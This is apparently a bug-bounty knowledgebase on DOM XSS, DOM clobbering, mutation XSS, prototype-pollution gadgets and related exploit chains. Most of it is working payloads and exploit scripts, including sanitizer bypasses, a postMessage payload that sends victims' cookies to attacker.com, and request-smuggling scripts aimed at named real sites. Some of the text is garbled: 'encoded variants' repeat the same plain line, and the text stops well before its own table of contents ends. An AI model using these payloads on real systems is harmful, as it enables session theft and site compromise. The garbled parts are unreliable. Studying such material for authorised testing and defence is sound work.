# DOM XSS & DOM Clobbering - Advanced Bug Bounty Knowledgebase

> **Research-grade knowledgebase for advanced bug bounty hunting, black-box testing, and client-side security assessments.**
> 
> Compiled from PortSwigger Research, PayloadsAllTheThings, HackTricks, GitHub security repositories, and real-world bug bounty findings.

---

## Table of Contents

1. [Basics](#basics)
2. [DOM XSS Theory](#dom-xss-theory)
3. [Browser DOM Internals](#browser-dom-internals)
4. [DOM XSS Payloads](#dom-xss-payloads)
5. [DOM Clobbering Payloads](#dom-clobbering-payloads)
6. [Mutation XSS Payloads](#mutation-xss-payloads)
7. [postMessage Exploitation Chains](#postmessage-exploitation-chains)
8. [Prototype Pollution + DOM XSS Chains](#prototype-pollution--dom-xss-chains)
9. [innerHTML/document.write Sinks](#innerhtmldocumentwrite-sinks)
10. [AngularJS DOM XSS Payloads](#angularjs-dom-xss-payloads)
11. [jQuery Selector Abuse](#jquery-selector-abuse)
12. [DOM Open Redirect Chains](#dom-open-redirect-chains)
13. [Service Worker + DOM XSS Chains](#service-worker--dom-xss-chains)
14. [Cache Poisoning + DOM XSS Chains](#cache-poisoning--dom-xss-chains)
15. [Request Smuggling + DOM XSS Chains](#request-smuggling--dom-xss-chains)
16. [OAuth + DOM XSS Chains](#oauth--dom-xss-chains)
17. [Parser Confusion Payloads](#parser-confusion-payloads)
18. [Browser Quirks](#browser-quirks)
19. [Gadget Chains](#gadget-chains)
20. [Real World Case Studies](#real-world-case-studies)
21. [Fuzzing Payloads](#fuzzing-payloads)
22. [Automation Workflows](#automation-workflows)
23. [Recon Methodology](#recon-methodology)
24. [Nuclei Templates](#nuclei-templates)
25. [Tools and Scanners](#tools-and-scanners)
26. [Advanced Research](#advanced-research)
27. [Bug Bounty Writeups](#bug-bounty-writeups)
28. [Payload Collections](#payload-collections)
29. [WAF Bypasses](#waf-bypasses)
30. [Detection Techniques](#detection-techniques)
31. [References](#references)

---

## Basics

### What is the DOM?

The **Document Object Model (DOM)** is a web browser's hierarchical representation of the elements on the page. Websites use JavaScript to manipulate the nodes and objects of the DOM, as well as their properties. DOM manipulation itself is not a problem, but JavaScript that handles data insecurely can enable various attacks.

### DOM-Based Vulnerability Lifecycle

```
Source (Attacker Input) → Taint Flow → Sink (Dangerous Function) → Execution
```

**Sources** (where attacker-controlled data enters):
- `document.URL`, `document.documentURI`, `document.URLUnencoded`
- `document.baseURI`, `location` object (hash, search, href)
- `document.cookie`, `document.referrer`, `window.name`
- `history.pushState`, `history.replaceState`
- `localStorage`, `sessionStorage`, `IndexedDB`
- Web messages (postMessage), reflected/stored data

**Sinks** (where dangerous execution occurs):
- **HTML Sinks**: `document.write()`, `element.innerHTML`, `element.outerHTML`
- **JavaScript Execution**: `eval()`, `setTimeout()`, `setInterval()`, `new Function()`
- **Navigation**: `location`, `location.href`, `location.replace()`, `open()`
- **jQuery**: `$()`, `.html()`, `.append()`, `.prepend()`, `.replaceWith()`
- **AngularJS**: `$parse`, `$eval`, template expressions
- **WebSocket**: `WebSocket()` constructor URL poisoning
- **Storage**: `localStorage.setItem()`, `sessionStorage.setItem()`

---

## DOM XSS Theory

### Taint-Flow Vulnerabilities

DOM-based vulnerabilities arise when a website contains JavaScript that takes an attacker-controllable value (source) and passes it into a dangerous function (sink) without proper sanitization.

#### Classic Example: DOM Open Redirect

```javascript
// Vulnerable code
goto = location.hash.slice(1)
if (goto.startsWith('https:')) {
    location = goto;
}
```

**Exploit URL:**
```
https://www.innocent-website.com/example#https://www.evil-user.net
```

When the victim visits this URL, JavaScript sets `location` to the attacker-controlled domain, causing a redirect.

#### Escalation to JavaScript Injection

If an attacker controls the start of the string passed to a redirection API, they can use the `javascript:` pseudo-protocol:

```
https://victim.com/#javascript:alert(document.domain)
```

### Sources vs Sinks Matrix

| Vulnerability Type | Example Sink |
|---------------------|--------------|
| DOM XSS | `document.write()`, `innerHTML` |
| Open Redirect | `window.location`, `location.href` |
| Cookie Manipulation | `document.cookie` |
| JavaScript Injection | `eval()`, `setTimeout()` |
| WebSocket Poisoning | `WebSocket()` constructor |
| Link Manipulation | `element.src`, `element.href` |
| postMessage Manipulation | `postMessage()` |
| Ajax Header Manipulation | `setRequestHeader()` |
| Local File Path Manipulation | `FileReader.readAsText()` |
| Client-side SQL Injection | `ExecuteSql()` |
| HTML5 Storage Manipulation | `sessionStorage.setItem()` |
| Client-side XPath Injection | `document.evaluate()` |
| Client-side JSON Injection | `JSON.parse()` |
| DOM Data Manipulation | `element.setAttribute()` |
| Denial of Service | `RegExp()` |

---

## Browser DOM Internals

### DOM Property Shadowing

When HTML elements have `id` or `name` attributes, they become accessible as global variables via `window[id]` or `window[name]`. This is the foundation of DOM Clobbering.

```html
<a id="someObject" name="url" href="//evil.com">
<script>
alert(window.someObject); // [object HTMLAnchorElement]
</script>
```

### Named Properties on Window Object

The browser automatically creates references for elements with `id` or `name`:
- Form elements with `name` attributes become properties of the form
- Multiple elements with the same ID create an `HTMLCollection`
- Iframes with `name` attributes create `window[name]` references to their `contentWindow`

### HTMLCollection Behavior

When multiple elements share the same ID, the browser groups them into a live `HTMLCollection`:

```html
<a id="x"><a id="x" name="y" href="Clobbered">
<script>
alert(x.y); // "Clobbered"
</script>
```

---

## DOM XSS Payloads

### Basic Payloads

```html
<!-- Standard script injection -->
<script>alert('XSS')</script>

<!-- Image onerror -->
<img src=x onerror=alert('XSS')>

<!-- SVG onload -->
<svg/onload=alert('XSS')>

<!-- Body onload -->
<body onload=alert('XSS')>

<!-- Input autofocus -->
<input autofocus onfocus=alert('XSS')>

<!-- Video poster -->
<video/poster/onerror=alert('XSS')>

<!-- Details toggle -->
<details/open/ontoggle="alert`1`">
```

### DOM-Specific Payloads

```javascript
// Using location.hash
document.write(location.hash.slice(1));
// Payload: #<script>alert(1)</script>

// Using innerHTML with query parameter
// URL: ?name=<img src=x onerror=alert(1)>

// Using document.URL
document.write(document.URL);
// Payload in URL path or query

// Using window.name (persists across navigations)
window.name = "<img src=x onerror=alert(1)>";
// Then navigate to vulnerable page that uses window.name
```

### HTML5 Tag Payloads

```html
<!-- Audio -->
<audio src onloadstart=alert(1)>

<!-- Marquee -->
<marquee onstart=alert(1)>

<!-- Meter -->
<meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>

<!-- Touch events (mobile) -->
<body ontouchstart=alert(1)>
<body ontouchend=alert(1)>
<body ontouchmove=alert(1)>

<!-- Hidden input with accesskey -->
<input type="hidden" accesskey="X" onclick="alert(1)">
<!-- Press CTRL+SHIFT+X to trigger -->

<!-- Newer browsers: contentvisibilityautostatechange -->
<input type="hidden" oncontentvisibilityautostatechange="alert(1)" style="content-visibility:auto">
```

### JavaScript Protocol Wrappers

```javascript
// javascript: protocol
javascript:prompt(1)

// Encoded variants
javascript:alert(1)
javascript:alert(1)
javascript:alert(1)

// Newline/tab bypass
java%0ascript:alert(1)   // LF
java%09script:alert(1)   // Tab
java%0dscript:alert(1)   // CR

// Comment bypass
javascript://%0Aalert(1)
javascript://anything%0D%0A%0D%0Awindow.alert(1)

// Escape character
\j\x07v\x07\s\cr\i\pt\:\x07\lert\(1\)
```

### Data URI Payloads

```html
<!-- Basic data URI -->
data:text/html,<script>alert(0)</script>

<!-- Base64 encoded -->
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+

<!-- Script src with data URI -->
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```

### SVG XSS Payloads

```html
<!-- Simple SVG -->
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>

<!-- SVG with desc -->
<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>

<!-- SVG foreignObject -->
<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>

<!-- SVG with iframe -->
<svg><foreignObject width="500" height="500">
  <iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert('svg');" width="400" height="250"/>
</foreignObject></svg>

<!-- SVG animateTransform -->
<svg><animatetransform onbegin="alert('svg animatetransform')"></animatetransform></svg>

<!-- Sub-SVG nesting -->
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <svg x="10">
    <script type="text/javascript">alert('sub-svg');</script>
  </svg>
</svg>
```

### Uppercase Output Bypass

```html
<IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>
```

### Hidden Input XSS

```html
<!-- Accesskey method -->
<input type="hidden" accesskey="X" onclick="alert(1)">

<!-- Modern browsers -->
<input type="hidden" oncontentvisibilityautostatechange="alert(1)" style="content-visibility:auto">
```

---

## DOM Clobbering Payloads

### Theory

DOM Clobbering is a technique where you inject HTML to manipulate the DOM and change JavaScript behavior. It overwrites global variables or object properties with DOM nodes instead of their expected values.

### Basic Clobbering: Single Level

```html
<!-- Clobber window.someObject -->
<a id="someObject"><a id="someObject" name="url" href="//evil.com">

<!-- Sink code -->
<script>
let someObject = window.someObject || {};
let script = document.createElement('script');
script.src = someObject.url; // "//evil.com"
document.body.appendChild(script);
</script>
```

### Two-Level Clobbering (x.y)

```html
<!-- Clobber x.y using DOM collection -->
<a id="x"><a id="x" name="y" href="Clobbered">

<!-- Sink -->
<script>
alert(x.y); // "Clobbered"
</script>
```

### Three-Level Clobbering (x.y.z)

```html
<!-- Clobber x.y.z using form + input -->
<form id="x" name="y"><input id="z"></form>
<form id="x"></form>

<!-- Sink -->
<script>
alert(x.y.z); // [object HTMLInputElement]
</script>
```

### Clobbering x.y.value

```html
<!-- Clobber x.y.value -->
<form id="x"><output id="y">I've been clobbered</output></form>

<!-- Sink -->
<script>
alert(x.y.value); // "I've been clobbered"
</script>
```

### Clobbering forEach (Chrome)

```html
<!-- Chrome RadioNodeList forEach -->
<form id="x">
  <input id="y" name="z">
  <input id="y">
</form>

<!-- Sink -->
<script>
x.y.forEach(element => alert(element));
</script>
```

### Clobbering document.getElementById()

```html
<!-- Override getElementById with html/body id -->
<html id="cdnDomain">clobbered</html>
<svg><body id="cdnDomain">clobbered</body></svg>

<!-- Sink -->
<script>
alert(document.getElementById('cdnDomain').innerText); // "clobbered"
</script>
```

### Clobbering username/password (Anchor URL)

```html
<!-- FTP/HTTP credentials in anchor -->
<a id="x" href="ftp:Clobbered-username:Clobbered-Password@a">

<!-- Sink -->
<script>
alert(x.username); // "Clobbered-username"
alert(x.password); // "Clobbered-Password"
</script>
```

### Firefox Base Tag Clobbering

```html
<!-- Firefox only -->
<base href="a:abc"><a id="x" href="Firefox<>">

<!-- Sink -->
<script>
alert(x); // "Firefox<>"
</script>
```

### Chrome Base Tag Clobbering

```html
<!-- Chrome only -->
<base href="a://Clobbered<>"><a id="x" name="x"><a id="x" name="xyz" href="123">

<!-- Sink -->
<script>
alert(x.xyz); // "a://Clobbered<>"
</script>
```

### Multi-Level iframe srcdoc Clobbering (4+ levels)

```html
<!-- Clobber a.b.c.d using nested iframes -->
<iframe name="a" srcdoc="
  <iframe srcdoc='<a id=c name=d href=cid:Clobbered>test</a><a id=c>' name=b>"></iframe>
  <style>@import '//portswigger.net';</style>

<!-- Sink -->
<script>
alert(a.b.c.d); // "cid:Clobbered"
</script>
```

**Note:** The `@import` in `<style>` creates a small delay allowing the iframe to load without `setTimeout`.

### Bypassing HTML Filters with Clobbering

```html
<!-- Clobber attributes to bypass filter -->
<form onclick="alert(1)"><input id="attributes">Click me
```

When a filter traverses the DOM and encounters the form, it tries to enumerate `form.attributes`. Since `attributes` is clobbered with the input element, the filter loops over the input element instead. The input element has undefined length, so the for loop conditions (`i < element.attributes.length`) are not met, and the filter skips the `onclick` attribute entirely.

### DOMPurify Bypass via Clobbering

```html
<!-- DOMPurify allows cid: protocol, doesn't encode quotes -->
<a id="defaultAvatar"><a id="defaultAvatar" name="avatar" href="cid:&quot;onerror=alert(1)//">
```

---

## Mutation XSS Payloads

### Theory

Mutation XSS (mXSS) exploits browser parsing inconsistencies. HTML sanitizers like DOMPurify create a clean DOM, but when that DOM is serialized back to HTML and then parsed again by the browser, the browser's parser may interpret the markup differently, re-creating malicious elements.

### DOMPurify Bypass: Chrome (Comment-based)

```html
<!-- Chrome mXSS vector -->
<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">
```

**How it works:**
1. Table gets re-ordered in the DOM
2. In HTML-based style, comments are ignored, but because the table is re-ordered, the comment becomes math-based style where comments are NOT ignored
3. The HTML parser gets confused, decodes the HTML, and inserts closing `</style>` and `</mglyph>`
4. The image gets decoded and renders because the comment is math-based and active

### DOMPurify Bypass: Firefox (CDATA-based)

```html
<!-- Firefox mXSS vector -->
<math><mtext><table><mglyph><style><![CDATA[</style><img title="]]&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">
```

### Firefox Alternative (HTML Comment)

```html
<!-- Also works in Firefox -->
<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">
```

### Classic Mutation XSS (noscript)

```html
<!-- Masato Kinugawa's noscript mXSS -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

### Template-based mXSS

```html
<!-- Exploiting innerHTML vs outerHTML differences -->
<template><script>alert(1)</script></template>
```

### SVG ForeignObject mXSS

```html
<svg><foreignObject><p><iframe src="javascript:alert(1)"></iframe></p></foreignObject></svg>
```

---

## postMessage Exploitation Chains

### Basic postMessage XSS

```javascript
// Vulnerable listener - no origin check, writes to innerHTML
window.addEventListener('message', function(event) {
    // BUG: No origin validation
    document.getElementById('output').innerHTML = event.data;
});

// Attacker page
const target = window.open('https://vulnerable-app.com');
setTimeout(() => {
    target.postMessage(
        '<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">',
        '*'
    );
}, 1000);
```

### Weak Origin Check Bypass

```javascript
// Vulnerable: insufficient origin check
window.addEventListener('message', function(event) {
    if (event.origin.indexOf('vulnerable-app.com') !== -1) {
        eval(event.data); // Dangerous sink
    }
});

// Attacker uses: vulnerable-app.com.attacker.com
```

### Null Origin Exploitation (Sandboxed iframe)

```html
<!-- Sandbox escape via null origin -->
<iframe sandbox="allow-scripts" src="data:text/html,<script>parent.postMessage('alert(1)','*')</script>">
```

Results in `event.origin === "null"` - bypasses checks comparing to specific origins.

### postMessage to eval Chain

```javascript
// Vulnerable handler
window.addEventListener('message', e => {
    const config = JSON.parse(e.data);
    new Function(config.callback)(); // Attacker controls callback
});

// Attack payload
{"callback": "alert(document.cookie)"}
```

### Marketo postMessage XSS (HackerOne #398054)

```javascript
// Exploit for Marketo forms
// Send mktoResponse message with followUpUrl
window.postMessage({
    mktoResponse: {
        "for": "someId",
        error: false,
        data: {
            followUpUrl: "javascript:alert(document.domain)"
        }
    }
}, '*');
```

### reveal.js postMessage XSS (CVE-2020-8127)

```javascript
// Exploit for reveal.js
// Step 1: Add malicious key binding
window.postMessage({
    method: "addKeyBinding",
    args: [{
        keyCode: 70,
        key: "F",
        description: "<img src=x onerror=alert(1)>"
    }]
}, '*');

// Step 2: Trigger help display
window.postMessage({
    method: "showHelp"
}, '*');
```

### Trusted Domain XSS Bridge

```javascript
// Parent (trusted page)
window.addEventListener("message", (e) => {
    if (e.origin !== "https://partner.com") return;
    const [type, html] = e.data.split("|")
    if (type === "Partner.learnMore") target.innerHTML = html;
});

// Attacker exploits XSS in partner.com iframe:
// <img src="" onerror="onmessage=(e)=>{eval(e.data.cmd)};">
// Then sends: postMessage({cmd: "top.frames[1].postMessage('Partner.learnMore|<img src=x onerror=alert(1)>','*')"}, "*")
```

### window.name Persistence Attack

```javascript
// Attacker page A sets window.name
window.name = "Baymax";

// Attacker page B opens target in window named "Baymax"
window.open(target_url, "Baymax");

// window.name persists across navigations, allowing opener access
```

---

## Prototype Pollution + DOM XSS Chains

### Theory

Client-side prototype pollution occurs when an attacker can modify `Object.prototype` properties through query parameters or other inputs. When JavaScript libraries later read these polluted properties, they can be tricked into executing attacker-controlled code.

### jQuery $.get XSS via Prototype Pollution

```
?__proto__[url][]=data:,alert(1)//
&__proto__[dataType]=script
```

### jQuery $.getScript XSS

```
?__proto__[src][]=data:,alert(1)//
```

### jQuery $(html) XSS

```
?__proto__[div][0]=1
&__proto__[div][1]=<img/src/onerror%3dalert(1)>
```

### jQuery $(x).attr XSS

```
?__proto__[OnError]=alert(1)
&__proto__[SRC]=fakeimagewontload.jpg
```

### jQuery $(x).on / $(x).submit XSS

```
?__proto__[handler][]=x
&__proto__[selector][]=<img/src/onerror%3Dalert(1)>
&__proto__[focus]=x
&__proto__[needsContext]=x
```

### Google reCAPTCHA XSS

```
?__proto__[srcdoc][]=<script>alert(1)</script>
```

### Lodash <= 4.17.15 XSS

```
?__proto__[sourceURL]=%E2%80%A8%E2%80%A9alert(1)
```

### DOMPurify <= 2.0.12 Bypass

```
?__proto__[ALLOWED_ATTR][0]=onerror
&__proto__[ALLOWED_ATTR][1]=src
```

```
?__proto__[documentMode]=9
```

### Google Closure XSS

```
?__proto__[*%20ONERROR]=1
&__proto__[*%20SRC]=1
```

```
?__proto__[CLOSURE_BASE_PATH]=data:,alert(1)//
```

### Vue.js XSS via Prototype Pollution

```
?__proto__[v-if]=_c.constructor('alert(1)')()
```

```
?__proto__[v-bind:class]=''.constructor.constructor('alert(1)')()
```

```
?__proto__[template]=<script>alert(1)</script>
```

### Knockout.js XSS

```
?__proto__[4]=a':1,[alert(1)]:1,'b
&__proto__[5]=,
```

### Zepto.js XSS

```
?__proto__[onerror]=alert(1)
```

```
?__proto__[html]=<img/src/onerror%3dalert(1)>
```

### Google Analytics Cookie Injection

```
?__proto__[cookieName]=COOKIE%3DInjection%3B
```

---

## innerHTML/document.write Sinks

### innerHTML XSS

```javascript
// Basic vulnerable pattern
const name = "<img src='x' onerror='alert(1)'>";
el.innerHTML = name; // Shows the alert

// innerHTML does NOT execute <script> tags but executes event handlers
```

### document.write XSS

```javascript
// Vulnerable code
document.write(location.hash.slice(1));

// Payload: #<img src=x onerror=alert(1)>
```

### document.writeln XSS

```javascript
// Similar to document.write
document.writeln(userInput);
```

### insertAdjacentHTML XSS

```javascript
// Vulnerable
element.insertAdjacentHTML('beforeend', userInput);

// Payload: <img src=x onerror=alert(1)>
```

### outerHTML XSS

```javascript
// Vulnerable
element.outerHTML = userInput;
```

### Trusted Types Bypass

```javascript
// If Trusted Types are enforced but policy is weak:
const policy = trustedTypes.createPolicy("my-policy", {
    createHTML: (input) => input // No sanitization!
});
element.innerHTML = policy.createHTML(untrustedString);
```

### Shadow DOM innerHTML

```javascript
// Shadow DOM manipulation
document.querySelector('custom-element').shadowRoot.innerHTML = payload;
```

### Web Components Vulnerability

```javascript
customElements.define('xss-element', class extends HTMLElement {
    connectedCallback() {
        this.innerHTML = location.search.slice(1);
    }
});
```

---

## AngularJS DOM XSS Payloads

### Expression Sandbox Escape (AngularJS < 1.6)

```javascript
// Classic sandbox escape
{{
    'a'.constructor.prototype.charAt=[].join;
    eval('x=1} } };alert(1)//');
}}
```

### Template Injection

```javascript
// Angular template injection
{{constructor.constructor('alert(1)')()}}

// Alternative
{{$eval('alert(1)')}}
```

### CSP Bypass via AngularJS

```javascript
// If AngularJS is loaded and CSP allows 'unsafe-eval'
// Inject: ng-app ng-csp
// Then use: {{constructor.constructor('alert(1)')()}}
```

### AngularJS 1.6+ (No Sandbox)

```javascript
// Since sandbox was removed, any expression executes
{{alert(1)}}
```

### Angular Element XSS

```javascript
// angular.element() does not apply SCE automatically
// Payload: <p onmouseover=alert('after');>After</p>
```

### AngularJS Select/Option Sanitizer Bypass (CVE-2020-7676)

```html
<!-- Exploits regex-based sanitizer parsing discrepancy -->
<select><option></option></select><img src=x onerror=alert(1)>
```

---

## jQuery Selector Abuse

### Hash Change Event Exploitation

```javascript
// Vulnerable jQuery hashchange handler
$(window).on('hashchange', function(){
    var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
    if (post) post.get(0).scrollIntoView();
});
```

**Exploit:**
```html
<iframe src="https://vulnerable-website.com/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```

**How it works:**
1. iframe loads with empty hash
2. onload appends XSS payload to hash
3. hashchange event fires
4. jQuery selector processes the payload as HTML
5. `print()` executes

### jQuery Selector HTML Injection

```javascript
// Vulnerable: $() selector with user input
var element = $(location.hash);

// Payload: #<img src=x onerror=alert(1)>
```

### jQuery .html() XSS

```javascript
// Vulnerable
$('#output').html(userInput);
```

### jQuery .append() / .prepend() XSS

```javascript
// Vulnerable
$('#container').append(userInput);
$('#container').prepend(userInput);
```

### jQuery .replaceWith() XSS

```javascript
// Vulnerable
$('#target').replaceWith(userInput);
```

---

## DOM Open Redirect Chains

### Basic DOM Open Redirect

```javascript
// Vulnerable code
let url = /https?:\/\/.+/.exec(location.hash);
if (url) {
    location = url[0];
}
```

**Exploit:**
```
https://victim.com/#https://evil.com
```

### Escalation to XSS via javascript: Protocol

```javascript
// If attacker controls start of string:
location = "javascript:alert(1)";
```

**Exploit:**
```
https://victim.com/#javascript:alert(1)
```

### Common Open Redirect Sinks

```javascript
// Sinks that can lead to open redirect:
location
location.host
location.hostname
location.href
location.pathname
location.search
location.protocol
location.assign()
location.replace()
open()
element.srcdoc
XMLHttpRequest.open()
jQuery.ajax()
$.ajax()
```

### jQuery Mobile Open Redirect

```javascript
// jQuery Mobile page transitions
$.mobile.changePage(userControlledURL);
```

---

## Service Worker + DOM XSS Chains

### Service Worker Hijacking via DOM Clobbering

```javascript
// If service worker registration is controlled via DOM:
// navigator.serviceWorker.register(clobberedURL);

// Clobber the URL source:
<a id="swUrl" href="//evil.com/sw.js">
<script>
navigator.serviceWorker.register(window.swUrl.href);
</script>
```

### Cache Poisoning via Service Worker

```javascript
// Malicious service worker can intercept requests
self.addEventListener('fetch', event => {
    if (event.request.url.includes('api/')) {
        // Return poisoned response
        event.respondWith(
            new Response('{"status":"pwned"}', {
                headers: {'Content-Type': 'application/json'}
            })
        );
    }
});
```

### Service Worker Scope Manipulation

```javascript
// Register with broad scope to control entire domain
navigator.serviceWorker.register('/sw.js', {scope: '/'});
```

---

## Cache Poisoning + DOM XSS Chains

### Web Cache Poisoning to Stored XSS

```http
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>
```

**Result:** The XSS payload is cached and served to all users.

### Cache Poisoning DoS

```http
GET / HTTP/1.1
Host: victim.com
X-Forwarded-Scheme: https
```

If the server returns 302 redirect loop and response is cached, the page becomes inaccessible.

### Cache Deception to Steal Dynamic Content

```
https://victim.com/profile.php/nonexistent.css
```

If the cache treats `.css` as static and caches the dynamic profile page, attacker can retrieve victim's data.

### Client-Side Cache Poisoning (Cisco Web VPN)

```javascript
// Poison cache with redirect gadget
fetch('https://redacted/', {
    method: 'POST',
    body: "GET /+webvpn+/ HTTP/1.1\r\nHost: x.psres.net\r\nX: Y",
    credentials: 'include'
}).catch(() => {
    location = 'https://redacted/+CSCOE+/win.js'
});
```

---

## Request Smuggling + DOM XSS Chains

### Browser-Powered Desync (Client-Side Desync)

```javascript
// Attack flow: victim visits attacker site
// Attacker's site makes browser send desync request

fetch('https://example.com/', {
    method: 'POST',
    body: "GET /hopefully404 HTTP/1.1\r\nX: Y",
    mode: 'no-cors',
    credentials: 'include'
}).then(() => {
    location = 'https://example.com/'
});
```

**Result:** The browser's connection pool is poisoned. The next navigation request gets the attacker's injected prefix appended.

### CL.0 Desync (Amazon.com case)

```http
POST /b/ HTTP/2
Host: www.amazon.com
Content-Length: 23

GET /404 HTTP/1.1
X: XGET / HTTP/1.1
Host: www.amazon.com
```

### Akamai Stacked HEAD Exploit

```javascript
// Exploit for Akamai redirect endpoints
fetch('https://www.capitalone.ca/assets', {
    method: 'POST',
    body: `HEAD /404/?cb=${Date.now()} HTTP/1.1\r\nHost: www.capitalone.ca\r\n\r\nGET /x?x=<script>alert(1)</script> HTTP/1.1\r\nX: Y`,
    credentials: 'include',
    mode: 'cors'
}).catch(() => {
    location = 'https://www.capitalone.ca/'
});
```

### Pulse Secure VPN Exploit

```javascript
// Target non-existent JS to avoid caching
function reset() {
    fetch('https://vpn.redacted/robots.txt', {mode: 'no-cors', credentials: 'include'})
    .then(() => {
        x.location = "https://vpn.redacted/dana-na/meeting/meeting_testjs.cgi?cb="+Date.now()
    });
    setTimeout(poison, 120);
}

function poison() {
    sendPoison();
    sendPoison();
    sendPoison();
    setTimeout(reset, 1000);
}

function sendPoison() {
    fetch('https://vpn.redacted/dana-na/css/ds_1234.css', {
        method: 'POST',
        body: 'GET /xdana-na/imgs/footerbg.gif HTTP/1.1\r\nHost: x.psres.net\r\nFoo: '+'a'.repeat(9826)+'\r\nConnection: keep-alive\r\n\r\n',
        mode: 'no-cors',
        credentials: 'include'
    });
}
```

---

## OAuth + DOM XSS Chains

### Dynamic Client Registration SSRF → XSS

```http
POST /openid-connect-server-webapp/register HTTP/1.1
Host: local:8080
Content-Type: application/json

{
    "redirect_uris": ["http://artsploit.com/redirect"],
    "logo_uri": "http://artsploit.com/xss.html"
}
```

Then navigate to `/api/clients/{id}/logo` to trigger XSS in OAuth server domain.

### redirect_uri Session Poisoning

**Attack Flow:**
1. User visits attacker page
2. Page redirects to OAuth with "trusted" `client_id`
3. Background request sends "untrusted" `client_id` to poison session
4. User approves first page, gets redirected to attacker's `redirect_uri` with token

```
/authorize?client_id=trusted&response_type=code&redirect_uri=http://artsploit.com/
```

### Spring Autobinding redirect_uri Bypass (CVE-2021-27582)

```
/authorize?client_id=c931f431-4e3a-4e63-84f7-948898b3cff9&response_type=code&scope=openid&prompt=consent&redirect_uri=http://trusted.example.com/redirect

/oauth/confirm_access?client_id=c931f431-4e3a-4e63-84f7-948898b3cff9&response_type=code&prompt=consent&scope=openid&redirectUri=http://malicious.example.com/steal_token
```

### WebFinger User Enumeration

```
/.well-known/webfinger?resource=http://x/anonymous&rel=http://openid.net/specs/connect/1.0/issuer
```

---

## Parser Confusion Payloads

### HTML Parser Confusion

```html
<!-- Table re-ordering causes parser confusion -->
<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">
```

### SVG Parser Confusion

```html
<svg><foreignObject><p><iframe src="javascript:alert(1)"></iframe></p></foreignObject></svg>
```

### Template Parser Confusion

```html
<template><script>alert(1)</script></template>
```

### Comment Parsing Confusion

```html
<!-- InnerHTML comment parsing -->
<div id="x"><!--</div><img src=x onerror=alert(1)>-->
```

### MIME Type Confusion

```javascript
// Force browser to interpret JS as HTML
// Content-Type: text/html
<script>alert(1)</script>
```

---

## Browser Quirks

### window.name Persistence

`window.name` persists across navigations, even cross-origin:

```javascript
// Page A (attacker)
window.name = "<img src=x onerror=alert(1)>";

// Navigate to victim
location = "https://victim.com/";

// Victim page reads window.name and injects into DOM
```

### about:blank Inheritance

`about:blank` inherits the origin of its opener:

```javascript
// Open about:blank from victim.com
var win = window.open('about:blank');
// win.document.origin === 'https://victim.com'
```

### javascript: URL Origin

The origin of a `javascript:` URL is the origin of the script that loaded it:

```javascript
// Executed in context of containing page
location.href = "javascript:alert(document.domain)";
```

### data: URL Origin

`data:` URLs have opaque origins ("null"):

```javascript
// postMessage to data: URL requires targetOrigin "*"
iframe.contentWindow.postMessage('data', '*');
```

### FTP URL Clobbering

```html
<a id="x" href="ftp:user:pass@host">
<script>
alert(x.username); // "user"
alert(x.password); // "pass"
</script>
```

### Base Tag Protocol Override

```html
<!-- Firefox -->
<base href="a:abc"><a id="x" href="Firefox<>">

<!-- Chrome -->
<base href="a://Clobbered<>"><a id="x" name="xyz" href="123">
```

---

## Gadget Chains

### jQuery Gadget Chain

```javascript
// Pollute jQuery internals
?__proto__[div][0]=1
&__proto__[div][1]=<img/src/onerror%3dalert(1)>

// Triggers when jQuery processes div elements
```

### Google Analytics Gadget

```javascript
// Pollute GA configuration
?__proto__[q][0][0]=require
&__proto__[q][0][1]=x
&__proto__[q][0][2]=https://attacker.com/gtm.js
```

### Google Tag Manager Gadget

```javascript
?__proto__[vtp_enableRecaptcha]=1
&__proto__[srcdoc]=<script>alert(1)</script>
```

### Lodash Template Gadget

```javascript
?__proto__[sourceURL]=  alert(1)
```

### Popper.js XSS Gadget

```javascript
?__proto__[arrow][style]=color:red;transition:all%201s
&__proto__[arrow][ontransitionend]=alert(1)
```

### Segment Analytics.js Gadget

```javascript
?__proto__[script][0]=1
&__proto__[script][1]=<img/src/onerror%3dalert(1)>
```

---

## Real World Case Studies

### Case Study 1: Gmail DOM Clobbering (Michał Bentkowski, 2020)

**Target:** Gmail
**Technique:** DOM Clobbering
**Impact:** XSS in one of the world's most secure web applications

**Details:** Used DOM Clobbering to exploit Gmail six years after the technique was first introduced. Demonstrated that even heavily defended applications can fall to advanced client-side attacks.

### Case Study 2: Amazon Browser-Powered Desync (James Kettle, 2022)

**Target:** Amazon.com
**Technique:** Client-Side Desync (CL.0)
**Impact:** Request smuggling on single-server architecture

**Details:** Amazon ignored Content-Length on `/b/` endpoint. Researcher stored live users' complete requests (including auth tokens) in shopping list. Could have been escalated to a self-replicating desync worm.

### Case Study 3: HackerOne Marketo postMessage XSS (#398054)

**Target:** HackerOne
**Technique:** postMessage origin validation bypass
**Impact:** DOM XSS on bug bounty platform

**Details:** Marketo forms used insecure postMessage handler. Attacker could send `mktoResponse` with `followUpUrl: "javascript:alert(1)"` to execute code in HackerOne domain.

### Case Study 4: MITREid Connect OAuth XSS (CVE-2021-26715)

**Target:** MITREid Connect OAuth Server
**Technique:** Dynamic Client Registration SSRF → XSS
**Impact:** XSS in authorization server domain

